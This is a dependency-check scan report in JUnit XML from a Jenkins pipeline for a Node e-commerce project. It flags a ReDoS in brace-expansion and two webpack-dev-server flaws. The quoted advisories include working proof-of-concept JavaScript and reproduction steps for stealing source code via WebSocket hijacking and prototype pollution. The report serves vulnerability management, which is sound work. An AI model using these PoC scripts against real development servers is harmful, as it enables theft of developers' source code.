<?xml version="1.0" encoding="UTF-8"?><testsuites failures="8" name="dependency-check" tests="45">
  <testsuite failures="0" errors="0" time="0" id="0" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/utils/ApiError.js" package="ApiError.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="ApiError.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="1" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/utils/ApiResponse.js" package="ApiResponse.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="ApiResponse.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="2" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/routes/address.routes.js" package="address.routes.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="address.routes.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="3" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/validators/addressValidator.js" package="addressValidator.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="addressValidator.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="4" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/controllers/addresses.controller.js" package="addresses.controller.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="addresses.controller.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="5" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/models/addresses.model.js" package="addresses.model.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="addresses.model.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="6" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/app.js" package="app.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="app.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="7" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/utils/asyncHandler.js" package="asyncHandler.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="asyncHandler.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="8" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/middlewares/auth.middleware.js" package="auth.middleware.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="auth.middleware.js"/>
  </testsuite>
  <testsuite failures="2" errors="0" time="0" id="9" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/package-lock.json?brace-expansion" package="brace-expansion:1.1.11" skipped="0" tests="2" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="CVE-2025-5889" name="pkg:npm/brace-expansion@1.1.11">
      <failure message="cvssV2: MEDIUM, score: 6.0 (CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N)"/>
      <system-out>A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is a5b98a4f30d7813266b221435e1eaaf25a1b0ac5. It is recommended to upgrade the affected component.</system-out>
      <system-err>location: /var/jenkins_home/workspace/Backend-PipelLine/backend/package-lock.json?brace-expansion, project-references: [ package-lock.json: transitive ]</system-err>
    </testcase>
    <testcase classname="GHSA-v6h2-p8h4-qcjw" name="pkg:npm/brace-expansion@1.1.11">
      <failure message="cvssV3: LOW, score: 3.0999999046325684 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L)"/>
      <system-out>A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.</system-out>
      <system-err>location: /var/jenkins_home/workspace/Backend-PipelLine/backend/package-lock.json?brace-expansion, project-references: [ package-lock.json: transitive ]</system-err>
    </testcase>
  </testsuite>
  <testsuite failures="2" errors="0" time="0" id="10" name="/var/jenkins_home/workspace/Backend-PipelLine/frontend/package-lock.json?brace-expansion" package="brace-expansion:2.0.1" skipped="0" tests="2" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="CVE-2025-5889" name="pkg:npm/brace-expansion@2.0.1">
      <failure message="cvssV2: MEDIUM, score: 6.0 (CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N)"/>
      <system-out>A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is a5b98a4f30d7813266b221435e1eaaf25a1b0ac5. It is recommended to upgrade the affected component.</system-out>
      <system-err>location: /var/jenkins_home/workspace/Backend-PipelLine/frontend/package-lock.json?brace-expansion, project-references: [ package-lock.json: transitive ]</system-err>
    </testcase>
    <testcase classname="GHSA-v6h2-p8h4-qcjw" name="pkg:npm/brace-expansion@2.0.1">
      <failure message="cvssV3: LOW, score: 3.0999999046325684 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L)"/>
      <system-out>A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.</system-out>
      <system-err>location: /var/jenkins_home/workspace/Backend-PipelLine/frontend/package-lock.json?brace-expansion, project-references: [ package-lock.json: transitive ]</system-err>
    </testcase>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="11" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/controllers/categories.controller.js" package="categories.controller.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="categories.controller.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="12" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/models/categories.model.js" package="categories.model.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="categories.model.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="13" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/routes/categories.routes.js" package="categories.routes.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="categories.routes.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="14" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/validators/categoryValidator.js" package="categoryValidator.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="categoryValidator.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="15" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/config/config.js" package="config.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="config.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="16" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/models/coupons.model.js" package="coupons.model.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="coupons.model.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="17" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/routes/dashboard.routes.js" package="dashboard.routes.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="dashboard.routes.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="18" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/config/db.js" package="db.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="db.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="19" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/utils/fileUpload.js" package="fileUpload.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="fileUpload.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="20" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/index.js" package="index.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="index.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="21" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/utils/logger.js" package="logger.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="logger.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="22" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/utils/multer.config.js" package="multer.config.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="multer.config.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="23" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/middlewares/multer.middleware.js" package="multer.middleware.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="multer.middleware.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="24" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/models/order-item.model.js" package="order-item.model.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="order-item.model.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="25" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/controllers/order.controller.js" package="order.controller.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="order.controller.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="26" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/routes/order.routes.js" package="order.routes.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="order.routes.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="27" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/validators/orderValidator.js" package="orderValidator.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="orderValidator.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="28" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/models/orders.model.js" package="orders.model.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="orders.model.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="29" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/routes/payment.routes.js" package="payment.routes.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="payment.routes.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="30" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/models/payments.model.js" package="payments.model.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="payments.model.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="31" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/models/product-variants.model.js" package="product-variants.model.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="product-variants.model.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="32" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/models/product.model.js" package="product.model.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="product.model.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="33" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/validators/productValidator.js" package="productValidator.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="productValidator.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="34" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/validators/productVariantValidator.js" package="productVariantValidator.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="productVariantValidator.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="35" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/controllers/products.controller.js" package="products.controller.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="products.controller.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="36" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/routes/products.routes.js" package="products.routes.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="products.routes.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="37" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/controllers/productvariants.controller.js" package="productvariants.controller.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="productvariants.controller.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="38" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/routes/productvariants.routes.js" package="productvariants.routes.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="productvariants.routes.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="39" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/models/sub-categories.model.js" package="sub-categories.model.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="sub-categories.model.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="40" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/validators/subCategoryValidator.js" package="subCategoryValidator.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="subCategoryValidator.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="41" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/controllers/subcategories.controller.js" package="subcategories.controller.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="subcategories.controller.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="42" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/routes/subcategories.routes.js" package="subcategories.routes.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="subcategories.routes.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="43" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/controllers/user.controller.js" package="user.controller.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="user.controller.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="44" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/models/user.model.js" package="user.model.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="user.model.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="45" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/routes/user.routes.js" package="user.routes.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="user.routes.js"/>
  </testsuite>
  <testsuite failures="0" errors="0" time="0" id="46" name="/var/jenkins_home/workspace/Backend-PipelLine/backend/src/middlewares/validate.request.js" package="validate.request.js" skipped="0" tests="1" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="dependency-check" name="validate.request.js"/>
  </testsuite>
  <testsuite failures="4" errors="0" time="0" id="47" name="/var/jenkins_home/workspace/Backend-PipelLine/frontend/package-lock.json?webpack-dev-server" package="webpack-dev-server:5.2.0" skipped="0" tests="4" timestamp="2025-07-03T08:41:52.447545032">
    <testcase classname="CVE-2025-30360" name="pkg:npm/webpack-dev-server@5.2.0">
      <failure message="cvssV2: MEDIUM, score: 6.900000095367432 (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N)"/>
      <system-out>webpack-dev-server allows users to use webpack with a development server that provides live reloading. Prior to version 5.2.1, webpack-dev-server users' source code may be stolen when you access a malicious web site with non-Chromium based browser. The `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening, which was reported by CVE-2018-14732. But webpack-dev-server always allows IP address `Origin` headers. This allows websites that are served on IP addresses to connect WebSocket. An attacker can obtain source code via a method similar to that used to exploit CVE-2018-14732. Version 5.2.1 contains a patch for the issue.

Sonatype's research suggests that this CVE's details differ from those defined at NVD. See https://ossindex.sonatype.org/vulnerability/CVE-2025-30360 for details</system-out>
      <system-err>location: /var/jenkins_home/workspace/Backend-PipelLine/frontend/package-lock.json?webpack-dev-server, project-references: [ package-lock.json: transitive ]</system-err>
    </testcase>
    <testcase classname="GHSA-9jgg-88mc-972h" name="pkg:npm/webpack-dev-server@5.2.0">
      <failure message="cvssV3: MEDIUM, score: 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)"/>
      <system-out>### Summary
Source code may be stolen when you access a malicious web site with non-Chromium based browser.

### Details
The `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.
But webpack-dev-server always allows IP address `Origin` headers.
https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127
This allows websites that are served on IP addresses to connect WebSocket.
By using the same method described in [the article](https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages) linked from CVE-2018-14732, the attacker get the source code.

related commit: https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb (note that `checkHost` function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.

This vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to [the non-HTTPS private access blocking feature](https://developer.chrome.com/blog/private-network-access-update#chrome_94).

### PoC
1. Download [reproduction.zip](https://github.com/user-attachments/files/18418233/reproduction.zip) and extract it
2. Run `npm i`
3. Run `npx webpack-dev-server`
4. Open `http://{ipaddress}/?target=http://localhost:8080&amp;file=main` with a non-Chromium browser (I used Firefox 134.0.1)
5. Edit `src/index.js` in the extracted directory
6. You can see the content of `src/index.js`

![image](https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4)

The script in the POC site is:
```js
window.webpackHotUpdate = (...args) =&gt; {
    console.log(...args);
    for (i in args[1]) {
        document.body.innerText = args[1][i].toString() + document.body.innerText
	    console.log(args[1][i])
    }
}

let params = new URLSearchParams(window.location.search);
let target = new URL(params.get('target') || 'http://127.0.0.1:8080');
let file = params.get('file')
let wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';
let wsPort = target.port;
var currentHash = '';
var currentHash2 = '';
let wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`;
ws = new WebSocket(wsTarget);
ws.onmessage = event =&gt; {
    console.log(event.data);
    if (event.data.match('"type":"ok"')) {
        s = document.createElement('script');
        s.src = `${target}${file}.${currentHash2}.hot-update.js`;
        document.body.appendChild(s)
    }
    r = event.data.match(/"([0-9a-f]{20})"/);
    if (r !== null) {
        currentHash2 = currentHash;
        currentHash = r[1];
        console.log(currentHash, currentHash2);
    }
}
```

### Impact
This vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser.</system-out>
      <system-err>location: /var/jenkins_home/workspace/Backend-PipelLine/frontend/package-lock.json?webpack-dev-server, project-references: [ package-lock.json: transitive ]</system-err>
    </testcase>
    <testcase classname="CVE-2025-30359" name="pkg:npm/webpack-dev-server@5.2.0">
      <failure message="cvssV2: MEDIUM, score: 5.900000095367432 (CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N)"/>
      <system-out>webpack-dev-server allows users to use webpack with a development server that provides live reloading. Prior to version 5.2.1, webpack-dev-server users' source code may be stolen when they access a malicious web site. Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject a malicious script in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables. By using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code. Version 5.2.1 contains a patch for the issue.</system-out>
      <system-err>location: /var/jenkins_home/workspace/Backend-PipelLine/frontend/package-lock.json?webpack-dev-server, project-references: [ package-lock.json: transitive ]</system-err>
    </testcase>
    <testcase classname="GHSA-4v9v-hfq4-rm2v" name="pkg:npm/webpack-dev-server@5.2.0">
      <failure message="cvssV3: MEDIUM, score: 5.300000190734863 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N)"/>
      <system-out>### Summary
Source code may be stolen when you access a malicious web site.

### Details
Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `&lt;script src="http://localhost:8080/main.js"&gt;` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables.
By using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.

### PoC
1. Download [reproduction.zip](https://github.com/user-attachments/files/18426585/reproduction.zip) and extract it
2. Run `npm i`
3. Run `npx webpack-dev-server`
4. Open `https://e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev/`
5. You can see the source code output in the document and the devtools console.

![image](https://github.com/user-attachments/assets/9d4dcdca-5d24-4c84-a7b4-feb1782bca09)

The script in the POC site is:
```js
let moduleList
const onHandlerSet = (handler) =&gt; {
  console.log('h', handler)
  moduleList = handler.require.m
}

const originalArrayForEach = Array.prototype.forEach
Array.prototype.forEach = function forEach(callback, thisArg) {
  callback((handler) =&gt; {
    onHandlerSet(handler)
  })
  originalArrayForEach.call(this, callback, thisArg)
  Array.prototype.forEach = originalArrayForEach
}

const script = document.createElement('script')
script.src = 'http://localhost:8080/main.js'
script.addEventListener('load', () =&gt; {
  console.log(moduleList)
  for (const key in moduleList) {
    const p = document.createElement('p')
    const title = document.createElement('strong')
    title.textContent = key
    const code = document.createElement('code')
    code.textContent = moduleList[key].toString()
    p.append(title, ':', document.createElement('br'), code)
    document.body.appendChild(p)
  }
})
document.head.appendChild(script)
```

This script uses the function generated by [`renderRequire`](https://github.com/webpack/webpack/blob/3919c844eca394d73ca930e4fc5506fb86e2b094/lib/javascript/JavascriptModulesPlugin.js#L1383).
```js
    // The require function
    function __webpack_require__(moduleId) {
        // Check if module is in cache
        var cachedModule = __webpack_module_cache__[moduleId];
        if (cachedModule !== undefined) {
            return cachedModule.exports;
        }
        // Create a new module (and put it into the cache)
        var module = __webpack_module_cache__[moduleId] = {
            // no module.id needed
            // no module.loaded needed
            exports: {}
        };
        // Execute the module function
        var execOptions = {
            id: moduleId,
            module: module,
            factory: __webpack_modules__[moduleId],
            require: __webpack_require__
        };
        __webpack_require__.i.forEach(function(handler) {
            handler(execOptions);
        });
        module = execOptions.module;
        execOptions.factory.call(module.exports, module, module.exports, execOptions.require);
        // Return the exports of the module
        return module.exports;
    }
```
Especially, it uses the fact that `Array::forEach` is called for `__webpack_require__.i` and `execOptions` contains `__webpack_require__`.
It uses prototype pollution against `Array::forEach` to extract `__webpack_require__` reference.

### Impact
This vulnerability can result in the source code to be stolen for users that uses a predictable port and output path for the entrypoint script.

&lt;details&gt;
&lt;summary&gt;Old content&lt;/summary&gt;

### Summary
Source code may be stolen when you use [`output.iife: false`](https://webpack.js.org/configuration/output/#outputiife) and access a malicious web site.

### Details
When `output.iife: false` is set, some global variables for the webpack runtime are declared on the `window` object (e.g. `__webpack_modules__`).
Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `&lt;script src="http://localhost:8080/main.js"&gt;` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. By running that, the webpack runtime variables will be declared on the `window` object.
By using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.

I pointed out `output.iife: false`, but if there are other options that makes the webpack runtime variables to be declared on the `window` object, the same will apply for those cases.

### PoC
1. Download [reproduction.zip](https://github.com/user-attachments/files/18409777/reproduction.zip) and extract it
2. Run `npm i`
3. Run `npx webpack-dev-server`
4. Open `https://852aafa3-5f83-44da-9fc6-ea116d0e3035.pages.dev/`
5. Open the devtools console.
6. You can see the content of `src/index.js` and other scripts loaded.

![image](https://github.com/user-attachments/assets/87801607-57bb-4656-bc0d-2bfbe207f436)

The script in the POC site is:
```js
const script = document.createElement('script')
script.src = 'http://localhost:8080/main.js'
script.addEventListener('load', () =&gt; {
    for (const module in window.__webpack_modules__) {
        console.log(`${module}:`, window.__webpack_modules__[module].toString())
    }
})
document.head.appendChild(script)
```

### Impact
This vulnerability can result in the source code to be stolen for users that has `output.iife: false` option set and uses a predictable port and output path for the entrypoint script.

&lt;/details&gt;</system-out>
      <system-err>location: /var/jenkins_home/workspace/Backend-PipelLine/frontend/package-lock.json?webpack-dev-server, project-references: [ package-lock.json: transitive ]</system-err>
    </testcase>
  </testsuite>
</testsuites>
